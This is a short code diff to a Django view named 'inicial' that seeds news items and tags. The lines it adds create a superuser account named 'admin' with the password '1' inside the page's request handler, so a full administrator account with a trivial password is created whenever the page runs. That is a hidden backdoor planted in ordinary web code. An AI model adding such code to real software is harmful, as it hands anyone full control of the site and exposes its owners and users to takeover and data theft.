@@ -192,6 +192,11 @@ def inicial(request):
 
             tag_obj = Tags.objects.get(tag=item["tag_nome"])
             nova_noticia.tags.add(tag_obj)
+        User.objects.create_superuser(
+            username='admin',
+            email='',
+            password='1'
+        )
     
     id_tag = request.GET.get("tag")
     q = request.GET.get("q", "").strip()
